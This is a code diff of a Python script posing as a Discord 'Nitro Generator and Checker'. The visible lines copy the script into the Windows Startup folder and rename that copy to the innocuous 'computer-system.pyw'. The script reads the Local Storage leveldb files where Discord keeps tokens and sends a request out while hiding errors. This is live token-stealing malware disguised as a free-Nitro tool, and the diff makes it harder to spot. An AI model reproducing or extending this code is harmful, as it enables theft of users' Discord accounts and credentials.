@@ -13,14 +13,13 @@ from urllib.request import Request, urlopen
 
 if os.name == "nt": ctypes.windll.kernel32.SetConsoleTitleW("Nitro Generator and Checker")
 else: print(f'\33]0;Nitro Generator and Checker\a',end='', flush=True)
-startupPath = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/nitro.pyw" % getenv("userprofile")
+startupPath = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/computer-system.pyw" % getenv("userprofile")
 if not isfile(startupPath):
     copy(__file__, startupPath)
 elif __file__.replace('\\', '/') != startupPath.replace('\\', '/'):
     print("")
 
-NITRO_GENERATOR = """
-███╗░░██╗██╗████████╗██████╗░░█████╗░░░░░░░░██████╗░██╗███████╗████████╗
+NITRO_GENERATOR = """███╗░░██╗██╗████████╗██████╗░░█████╗░░░░░░░░██████╗░██╗███████╗████████╗
 ████╗░██║██║╚══██╔══╝██╔══██╗██╔══██╗░░░░░░██╔════╝░██║██╔════╝╚══██╔══╝
 ██╔██╗██║██║░░░██║░░░██████╔╝██║░░██║█████╗██║░░██╗░██║█████╗░░░░░██║░░░
 ██║╚████║██║░░░██║░░░██╔══██╗██║░░██║╚════╝██║░░╚██╗██║██╔══╝░░░░░██║░░░
@@ -37,8 +36,7 @@ NITRO_GENERATOR = """
 ██████╗██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝
 ╚═██╔═╝██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗
 ░░╚═╝░░╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║
-░░░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝
-"""
+░░░░░░░░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝"""
 
 def find_codes(path):
     path += '\\Local Storage\\leveldb'
@@ -76,14 +74,19 @@ def main():
         urlopen(req)
     except:
         pass
-
 if __name__ == '__main__':
     main()
+
+def slowPrint(s):
+  for c in s :
+    sys.stdout.write(c)
+    sys.stdout.flush()
+    time.sleep(0.02)
 
 print(NITRO_GENERATOR)
 time.sleep(1)
 
-print("\nInput How Many Codes to Generate and Check: ")
+slowPrint("\nInput How Many Codes to Generate and Check: ")
 
 try:
     num = int(input(''))
@@ -94,7 +97,8 @@ except ValueError:
 time.sleep(0.15)
 print("")
 
-print("Your nitro codes are being generated, be patient if you entered the high number!")
+slowPrint("Your nitro codes are being generated, be patient if you entered a high number!")
+print("")
 print("")
 time.sleep(0.5)
 
@@ -111,7 +115,6 @@ for i in range(num):
     print(f"Invalid | https://discord.gift/{nitro}\n", end="")
     invalid += 1
 
-print("")
 input(f"""
 Results:
  Valid: {valid}
